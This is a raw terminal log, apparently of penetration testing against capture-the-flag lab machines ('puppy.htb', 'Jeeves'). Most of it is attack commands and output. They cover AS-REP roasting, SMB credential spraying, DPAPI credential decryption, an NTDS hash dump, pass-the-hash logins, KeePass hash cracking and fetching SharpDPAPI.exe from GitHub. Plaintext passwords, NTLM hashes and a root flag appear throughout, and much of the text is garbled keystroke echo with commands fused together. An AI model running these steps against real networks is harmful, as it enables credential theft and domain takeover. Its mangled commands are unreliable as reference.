+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 'Password123! -dc-ip 10.129.232.75 -request -format hashcat
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 'HJKL2025!'t
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] ' -dc-ip 10.129.232.75 -request -format hashcat
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 'Password123!' -dc-ip 10.129.232.75 -request -format hashcat
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 23!' c-ip75 uest rmat
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] nxc smb 10.129.232.75 -u steph.cooper_adm -p 'steph2025!'
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] -p 'steph2025! -p puppy_passwords.txtnxc-u-pimpacket-GetNPUsers puppy.htb/ant.edwards:'Antman2025!' -dc-ip 10.129.232.75 -request -format hashcat
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] packet-GetNPUserspprd
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 'Antman2025!' -dc-ip-request -format
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] python3 -m http.server 6969
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] 3 -m http.serfile site-backup-2024-12-30.zipe site-unzip site-backup-2024-12-30.zipipcd puppy                        cd pufile nms-auth-config.xml.bakfilelesslesscat catnote while logged in as adam.silver with reset password and enable user, found Backups directory at based directory that has file site-backup-2024-12-30.zip. downloaded with evil-winrm's download command. Unzipped on Kali, created a puppy directory that has a file called nms-auth-config.xml.bak. this file contains steph.cooper u/n and ChefSteph2025! password.te's download command. Unzipped on Kali, created a puppy directory that has a file called nms-auth-config.xml.bak. this file contains steph.cooper u/n and ChefSteph2025! password.nxc smb 10.129.232.75 -u steph.cooper -p ChefSteph2025!
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] c -u-p_adm -p ChefSteph2025!ad
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] -p'ChefSteph2025!''ChefSteph2025!'grep -ri "password\|username\|credential"
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] . 2>/dev/null | grep -v ".zip" | head -20ep -ri "password\|username\|credential"
+[2026-02-06 11:44:28] [w=2:tmux] [p=%2] [OUT] . 2>/dev/null | grep -v ".zip" | head -20find . -type f
+[2026-02-06 11:44:29] [w=2:tmux] [p=%2] [OUT] . -type fcd S-1-5-21-1487982659-1829050783-2281216199-1107cd S-1-5-21-rmdir S-1-5-21-1487982659-1829050783-2281216199-1107rmdircat C8D69EBE9A43E9DEBF6B5FBD48B521B9
+[2026-02-06 11:44:29] [w=2:tmux] [p=%2] [OUT] t Cmkdir dpapi                         dirmv 556a2412-1275-4ccf-b721-e6a0b4f90407 C8D69EBE9A43E9DEBF6B5FBD48B521B9 dpapimv 55cd dpapi
+[2026-02-06 11:44:29] [w=2:tmux] [p=%2] [OUT] pip3 install pypykatzpixpipxeurepath      pypykatz dpapi credential C8D69EBE9A43E9DEBF6B5FBD48B521B9 --masterkey 556a2412-1275-4ccf-b721-e6a0b4f90407 --password ChefSteph2025!ykatz--masterkey--passwordmasterkey 556a2412-1275-4ccf07 ChefSteph2025!                                                         07 ChefStepwget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe -O SharpDPAPI.exet htt-Oip a
+[2026-02-06 11:44:29] [w=2:tmux] [p=%2] [OUT] ip aimpacket-smbserver share . -smb2support -username test -password testimpacket-smbserver. -smb2support -username-passworddpapi.py mastkey -fil556a2412-1275-4ccf-b721-e6a0b4f90407 -sid C8D69EBE9A43E9DEBF6B5FBD48B521B9 -password 'ChefSteph2025!'dpapi.py masterkey556a2412-1275-4ccf-b721-f90407 -sC8D69EBE9A43E9DEBFsid S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!'dpapi.py-file-sid-password 'ChefSteph2025!' -password 'ChefSteph2025!'
+[2026-02-06 11:44:29] [w=2:tmux] [p=%2] [OUT] -password 'ChefSteph2025!'556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'407 -sid107 sword 025!'note use dpapi.py to decrypt the key from C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107 called 556a2412-1275-4ccf-b721-e6a0b4f90407 decrypted key Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84e useo decr\ap659-1829050783-2281216199-dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+[2026-02-06 11:44:29] [w=2:tmux] [p=%2] [OUT] pi.py-file-keynote used dpapi to decrypt the credential C8D69EBE9A43E9DEBF6B5FBD48B521B9 in directory C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\ using the key from previous step 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84e useecrypF6B5decrypteds are steph.cooper_adm password FivethChipOnItsWay2025!
+[2026-02-06 11:44:29] [w=2:tmux] [p=%2] [OUT] impacket-secretsdump
+[2026-02-06 11:44:30] [w=2:tmux] [p=%2] [OUT] acket-secretsdumpnxc      c secretsdumpmb 10.129.12.16 -u administrator -p 'FivethChipOnItsWay2025!' --ntds --user Administrator-u-p 'FivethChipOnItsWay2025!' --ntds --usersteph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --user Administratordm -p 25!' ntds userevil-winrm -i 10.129.12.16 -u administrator -H aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75bil-winrm -i12-uor -H aad3b435b51404eeaad3b435b51404ee:bb0                                 nxc smb 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay25!' --ntds --usersc smb 10.12-uph-p 'FivethChipOnItsWay2025!' --ntds --usersnote logged in using st's password FivethChipOnItsWay2025! and navigated to Adminstrator Desktop and pull the root flag root.txt d667d5adfba04e5cc5d0b6ca0f9335c4test's pass025! and navigated to Adminstrator Desktop and pull the root flag root.txt d667d5adfba04e5cc5d0b6ca0f9335c4used nxc smb 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --users to dump usehashes
+[2026-02-06 11:44:31] [w=2:tmux] [p=%2] [OUT] used-uoper_adm -p ' --ntds --users to dump user hashes
+[2026-02-06 11:44:35] [w=2:tmux] [p=%2] [OUT] sudo /usr/share/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] sudo /usr/share/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtsudo /usr/share/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtsudo /usr/share/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtht= /usr/share/joho=/ j/u /us /usr/share/esr rr/ /usr/shara/s hsh sudo /usr/sh keepass.hash -wordlist=/usr/share/wordlists/rockyou.txtha sudo /usr/s keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt/ar /usr/rre se/ /usu/w /wo /or keepass.hashrd ddl sud keepass.hashsuli susis sst  keepass.hash keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt~/.local/bin/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt~/.local/bin/john keepass.hash
+[2026-02-06 11:44:42] [pane=%2] [CMD_START] ~/.local/bin/john keepass.hash -wordlist=/usr/share/wordlists/rockyou.txt
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Using default input encoding: UTF-8
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Cost 1 (t (rounds)) is 6000 for all loaded hashes
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Cost 2 (m) is 0 for all loaded hashes
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Cost 3 (p) is 0 for all loaded hashes
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Will run 4 OpenMP threads
+[2026-02-06 11:44:42] [w=2:tmux] [p=%2] [OUT] Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
+[2026-02-06 11:44:43] [w=2:tmux] [p=%2] [OUT] Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+[2026-02-06 11:44:43] [w=2:tmux] [p=%2] [OUT] Failed to use huge pages (not pre-allocated via sysctl? that's fine)
+[2026-02-06 11:44:44] [w=2:tmux] [p=%2] [OUT] moonshine1       (CEH)
+[2026-02-06 11:44:44] [w=2:tmux] [p=%2] [OUT] 1g 0:00:00:01 DONE (2026-02-06 11:44) 0.5587g/s 30712p/s 30712c/s 30712C/s morochita..moonshine1
+[2026-02-06 11:44:44] [w=2:tmux] [p=%2] [OUT] Use the "--show" option to display all of the cracked passwords reliably
+[2026-02-06 11:44:44] [w=2:tmux] [p=%2] [OUT] Session completed
+[2026-02-06 11:47:34] [w=0:tmux] [p=%0] [OUT] systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+[2026-02-06 11:47:38] [w=0:tmux] [p=%0] [OUT] dir C:\Users\Administrator\D
+[2026-02-06 11:47:38] [w=0:tmux] [p=%0] [OUT] At line:1 char:1
+[2026-02-06 11:47:38] [w=0:tmux] [p=%0] [OUT] + dir C:\Users\Administrator\
+[2026-02-06 11:47:38] [w=0:tmux] [p=%0] [OUT] + ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[2026-02-06 11:47:38] [w=0:tmux] [p=%0] [OUT] + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\:String) [Get-ChildItem], UnauthorizedAccessEx
+[2026-02-06 11:47:38] [w=0:tmux] [p=%0] [OUT] ception
+[2026-02-06 11:47:38] [w=0:tmux] [p=%0] [OUT] + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+[2026-02-06 12:17:47] [w=2:tmux] [p=%2] [OUT] /n
+[2026-02-06 12:17:48] [w=2:tmux] [p=%2] [OUT] mapnmamaap
+[2026-02-06 12:17:48] [pane=%2] [CMD_START] cd ../nmap
+[2026-02-06 12:17:49] [pane=%2] [CMD_START] ll
+[2026-02-06 12:17:49] [w=2:tmux] [p=%2] [OUT] total 16
+[2026-02-06 12:17:49] [w=2:tmux] [p=%2] [OUT] -rw-rw-r-- 1 b7h30 b7h30  453 Feb  4 19:23 JeevesAllPorts.gnmap
+[2026-02-06 12:17:49] [w=2:tmux] [p=%2] [OUT] -rw-rw-r-- 1 b7h30 b7h30  487 Feb  4 19:23 JeevesAllPorts.nmap
+[2026-02-06 12:17:49] [w=2:tmux] [p=%2] [OUT] -rw-rw-r-- 1 b7h30 b7h30 1930 Feb  4 19:23 JeevesAllPorts.xml
+[2026-02-06 12:17:49] [w=2:tmux] [p=%2] [OUT] -rw-rw-r-- 1 b7h30 b7h30 1404 Feb  4 19:35 JeevesServicesVersions.txt
+[2026-02-06 12:17:59] [pane=%2] [CMD_START] cat JeevesServicesVersions.txt
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] # Nmap 7.98 scan initiated Wed Feb  4 19:34:40 2026 as: /usr/lib/nmap/nmap --privileged -p80,135,445,50000 -sSCV --min-rate=2000 -Pn -oN nmap/JeevesServicesVersions.txt 10.129.228.112
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] Nmap scan report for 10.129.228.112
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] Host is up (0.033s latency).
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] PORT      STATE SERVICE      VERSION
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] 80/tcp    open  http         Microsoft IIS httpd 10.0
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] | http-methods:
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_  Potentially risky methods: TRACE
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_http-server-header: Microsoft-IIS/10.0
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_http-title: Ask Jeeves
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] 135/tcp   open  msrpc        Microsoft Windows RPC
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] 50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_http-title: Error 404 Not Found
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_http-server-header: Jetty(9.4.z-SNAPSHOT)
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] Host script results:
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] | smb-security-mode:
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |   account_used: guest
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |   authentication_level: user
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |   challenge_response: supported
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_  message_signing: disabled (dangerous, but default)
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_clock-skew: mean: -1h59m51s, deviation: 0s, median: -1h59m52s
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] | smb2-security-mode:
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |   3.1.1:
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_    Message signing enabled but not required
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] | smb2-time:
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |   date: 2026-02-04T22:34:58
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] |_  start_date: 2026-02-04T22:05:08
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[2026-02-06 12:17:59] [w=2:tmux] [p=%2] [OUT] # Nmap done at Wed Feb  4 19:35:27 2026 -- 1 IP address (1 host up) scanned in 47.11 seconds
+[2026-02-06 12:18:22] [w=2:tmux] [p=%2] [OUT] mb   smb 10.129.232.75 -u adam.silver -p 'Password123!'smb -u-p 'Password123!'
+[2026-02-06 12:18:22] [w=2:tmux] [p=%2] [OUT] nxc-u-p 'Password123!'
+[2026-02-06 12:18:26] [w=2:tmux] [p=%2] [OUT] nxc-u-p 'Password123!'nxc-u-p 'Password123!'nxc-u-p 'Password123!'as ss sword123!' word123!' ord123!' 2 -u adam.silver -p 'Password123!'8 -u adam.silver -p 'Password123!'. -u adam.silver -p 'Pa
+[2026-02-06 12:18:30] [w=2:tmux] [p=%2] [OUT] sword123!'1 -u adam.silver -p 'Password123!'1 -u adam.silver -p 'Password123!'2 -u adam.silver -p 'Password123!'nxc-u-p 'Password123!'nxc-u-p 'Password123!' -p 'Pas  -p 'Pas  -p 'Pass  -p 'Pas
+[2026-02-06 12:18:36] [w=2:tmux] [p=%2] [OUT] word123!' ord123!' rd123!' d123!' 123!' 23!' 3!' a -p 'Password123!'d -p 'Password123!', -p 'Password123!'o -p 'Password123!'m -p 'Password123!'o -p 'Password123!'s -p 'Password123!'word123!' ord123!' rd123!' d123!' 123!' m -p 'Password123!'i -p 'Password123!'n -p 'Password123!'i -p 'Password123!'s -p 'Password123!'t -p 'Pa
+[2026-02-06 12:18:38] [w=2:tmux] [p=%2] [OUT] sword123!'r -p 'Password123!'a -p 'Password123!'t -p 'Password123!'o -p 'Password123!'r -p 'Password123!'
+[2026-02-06 12:18:59] [w=2:tmux] [p=%2] [OUT] nxc-u-p 'Password123!'nxc-u-p 'Password123!'nxc-u-p 'Password123!'nxc-u-p 'Password123!'' ' ' ' ' ' ' ' ' ' ' ' S1TjAtJHKsugh9oC4VZl'
+[2026-02-06 12:18:59] [pane=%2] [CMD_START] nxc smb 10.129.228.112 -u administrator -p 'S1TjAtJHKsugh9oC4VZl'
+[2026-02-06 12:19:01] [w=2:tmux] [p=%2] [OUT] SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+[2026-02-06 12:19:01] [w=2:tmux] [p=%2] [OUT] SMB         10.129.228.112  445    JEEVES           [-] Jeeves\administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE
+[2026-02-06 12:21:38] [pane=%2] [CMD_START] nxc smb 10.129.228.112 -u bob -p 'lCEUnYPjNfIuPZSzOySA'
+[2026-02-06 12:21:39] [w=2:tmux] [p=%2] [OUT] SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+[2026-02-06 12:21:39] [w=2:tmux] [p=%2] [OUT] SMB         10.129.228.112  445    JEEVES           [-] Jeeves\bob:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE
+[2026-02-06 12:23:18] [w=2:tmux] [p=%2] [OUT] smb 10.129.228.112 -u bob -p 'lCEUnYPjNfIuPZSzOySA'nx
+[2026-02-06 12:23:18] [w=2:tmux] [p=%2] [OUT] nxc smb 10.129.228.112 -u bob -p 'lCEUnYPjNfIuPZSzOySA'n
+[2026-02-06 12:23:18] [w=2:tmux] [p=%2] [OUT] nnxc smb 10.129.228.112 -u bob -p 'lCEUnYPjNfIuPZSzOySA'
+[2026-02-06 12:23:21] [w=2:tmux] [p=%2] [OUT] nnnxc smb 10.129.228.112 -u bob -p 'lCEUnYPjNfIuPZSzOySA'ns
+[2026-02-06 12:23:24] [w=2:tmux] [p=%2] [OUT] nsn nnxc smb 10.129.228.112 -u bob -p 'lCEUnYPjNfIuPZSzOySA'nxynxnxcSnxcc Ac p
+[2026-02-06 12:23:27] [w=2:tmux] [p=%2] [OUT] sec xec
+[2026-02-06 12:23:27] [pane=%2] [CMD_START] nxc psexec 
+[2026-02-06 12:23:28] [w=2:tmux] [p=%2] [OUT] usage: nxc [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress]
+[2026-02-06 12:23:28] [w=2:tmux] [p=%2] [OUT] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
+[2026-02-06 12:23:28] [w=2:tmux] [p=%2] [OUT] [--dns-timeout DNS_TIMEOUT]
+[2026-02-06 12:23:28] [w=2:tmux] [p=%2] [OUT] {ldap,vnc,ftp,nfs,ssh,winrm,rdp,mssql,smb,wmi} ...
+[2026-02-06 12:23:28] [w=2:tmux] [p=%2] [OUT] nxc: error: argument protocol: invalid choice: 'psexec' (choose from ldap, vnc, ftp, nfs, ssh, winrm, rdp, mssql, smb, wmi)
+[2026-02-06 12:23:42] [w=2:tmux] [p=%2] [OUT] N' 
+[2026-02-06 12:23:42] [w=2:tmux] [p=%2] [OUT] '
+[2026-02-06 12:23:42] [w=2:tmux] [p=%2] [OUT] ' '
+[2026-02-06 12:23:53] [w=2:tmux] [p=%2] [OUT] ' ' ' ' ' ' e0fb1fb85756c24235ff238cbe81fe00'nxc-u-p 'e0fb1fb85756c24235ff238cbe81fe00'nxc-u-p 'e0fb1fb85756c24235ff238cbe81fe00'
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] nxc-u-p 'e0fb1fb85756c24235ff238cbe81fe00'nxc-u-p 'e0fb1fb85756c24235ff238cbe81fe00'nxc-u-p 'e0fb1fb85756c24235ff238cbe81fe00'nxc-u-p 'e0fb1fb85756c24235ff238cbe81fe00'-57 -h 'e0fb1fb85756c24235ff238cbe81fe00'ha 'e0fb1fb85756c24235ff238cbe81fe00'ad 'e0fb1fb85756c24235ff238cbe81fe00'dh 'e0fb1fb85756c24235ff238cbe81fe00'd 'e0fb1fb a 'e0fb1fb8 as 'e0fb1fb85756c24235ff238cbe81fe00'sh 'e0fb1fb85756c24235ff238cbe81fe00'fb b8 85 57 10.129.228.112 -u  -hash 'e0fb1fb85756c24235ff238cbe81fe00'10.129.228.112 -u   a -hash 'e0fb1fb85756c24235ff238cbe81fe00'd -hash 'e0fb1fb85756c24235ff238cbe81fe00'm -hash 'e0fb1fb85756c24235ff238cbe81fe00'i -hash 'e0fb1fb85756c24235ff238cbe81fe00'n -hash 'e0fb1fb85756c24235ff238cbe81fe00'i -hash 'e0fb1fb85756c24235ff238cbe81fe00's -hash 'e0fb1fb85756c24235ff238cbe81fe00't -hash 'e0fb1fb85756c24235ff238cbe81fe00'r -hash 'e0fb1fb85756c24235ff238cbe81fe00'a -hash 'e0fb1fb85756c24235ff238cbe81fe00't -hash 'e0fb1fb85756c24235ff238cbe81fe00'o -hash 'e0fb1fb85756c24235ff238cbe81fe00'r -hash 'e0fb1fb85756c24235ff238cbe81fe00'
+[2026-02-06 12:24:04] [pane=%2] [CMD_START] nxc smb 10.129.228.112 -u administrator -hash 'e0fb1fb85756c24235ff238cbe81fe00'
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--pfx-cert PFXCERT]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--pfx-base64 PFXB64] [--pfx-pass PFXPASS] [--pem-cert PEMCERT] [--pem-key PEMKEY]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]] [--options]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [-H HASH [HASH ...]] [--delegate DELEGATE] [--delegate-spn DELEGATE_SPN]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--generate-st GENERATE_ST] [--self] [-d DOMAIN | --local-auth] [--port PORT]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--no-smbv1] [--no-admin-check]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--generate-hosts-file GENERATE_HOSTS_FILE]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--generate-krb5-file GENERATE_KRB5_FILE] [--generate-tgt GENERATE_TGT]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--sam [{secdump,regdump}]] [--lsa [{secdump,regdump}]] [--ntds [{vss,drsuapi}]]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--kerberos-keys] [--history | --enabled] [--user USERNTDS]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--dpapi [{nosystem,cookies} ...]] [--sccm [{wmi,disk}]] [--mkfile MKFILE]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--pvk PVK] [--list-snapshots [LIST_SNAPSHOTS]] [--shares [SHARES]]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--exclude-shares EXCLUDE_SHARES [EXCLUDE_SHARES ...]] [--dir [DIR]] [--interfaces]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--no-write-check] [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--disks]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--users [USER ...]] [--users-export USERS_EXPORT] [--groups [GROUP]]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--local-groups [GROUP]] [--computers [COMPUTER]] [--pass-pol]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--rid-brute [MAX_RID]] [--smb-sessions] [--reg-sessions [REG_SESSIONS]]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--loggedon-users [LOGGEDON_USERS]] [--loggedon-users-filter LOGGEDON_USERS_FILTER]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--qwinsta [QWINSTA]] [--tasklist [TASKLIST]] [--taskkill TASKKILL]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--wmi-query QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--only-files] [--silent] [--pattern PATTERN [PATTERN ...] |
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] --regex REGEX [REGEX ...]] [--put-file FILE FILE] [--get-file FILE FILE]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--append-host] [--exec-method {mmcexec,atexec,smbexec,wmiexec}]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--dcom-timeout DCOM_TIMEOUT] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] [--clear-obfscripts] [--force-ps32] [--no-encode]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] target [target ...]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] positional arguments:
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s)
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] containing a list of targets, NMap XML or .Nessus file(s)
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] options:
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] -h, --help            show this help message and exit
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] -H, --hash HASH [HASH ...]
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] NTLM hash(es) or file(s) containing NTLM hashes
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] --delegate DELEGATE   Impersonate user with S4U2Self + S4U2Proxy
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] --delegate-spn DELEGATE_SPN
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] SPN to use for S4U2Proxy, if not specified the SPN used will be
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] cifs/<target>
+[2026-02-06 12:24:04] [w=2:tmux] [p=%2] [OUT] --generate-st GENERATE_ST
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] Store the S4U Service Ticket in the specified file
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --self                Only do S4U2Self, no S4U2Proxy (use with delegate)
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] -d, --domain DOMAIN   domain to authenticate to
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --local-auth          authenticate locally to each target
+[2026-02-06 12:24:05] [w=2:tmux] [p=%2] [OUT] --port PORT           SMB port (default: 445)
